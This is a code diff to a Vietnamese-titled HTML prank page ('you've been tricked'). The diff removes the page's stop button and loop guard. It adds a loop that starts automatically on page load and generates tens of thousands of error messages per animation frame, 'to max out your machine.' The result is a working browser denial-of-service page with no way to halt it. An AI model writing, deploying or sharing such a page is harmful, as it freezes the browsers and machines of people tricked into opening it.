@@ -24,28 +24,17 @@
             overflow-y: auto;
             display: none;
         }
-        button {
-            margin-top: 20px;
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
     </style>
 </head>
 <body>
     <h1>Bị dụ rồi</h1>
-    <p>This page runs an infinite loop, displaying errors for each iteration.</p>
-    <button id="stopButton" style="display: none">Stop Loop</button>
+    <p>This page runs an infinite loop, displaying errors to max out your machine.</p>
     <div id="errorContainer"></div>
 
     <script>
         let errorCount = 0;
-        let isRunning = true;
-        let timeoutId;
 
         function simulateError() {
-            if (!isRunning) return;
-
             errorCount++;
             const errorMessage = `Error ${errorCount}: Simulated error during loop ${errorCount}`;
 
@@ -60,20 +49,17 @@
             }
 
             errorContainer.scrollTop = errorContainer.scrollHeight;
-
-            simulateError();
-            simulateError();
-            simulateError();
         }
 
-        document.getElementById('stopButton').addEventListener('click', () => {
-            isRunning = false;
-            clearTimeout(timeoutId);
-            document.getElementById('stopButton').disabled = true;
-        });
+        function stressLoop() {
+            for (let i = 0; i < 10000; i++) {
+                simulateError();
+            }
+            requestAnimationFrame(stressLoop);
+        }
 
         window.onload = function() {
-            simulateError();
+            stressLoop();
         };
     </script>
 </body>
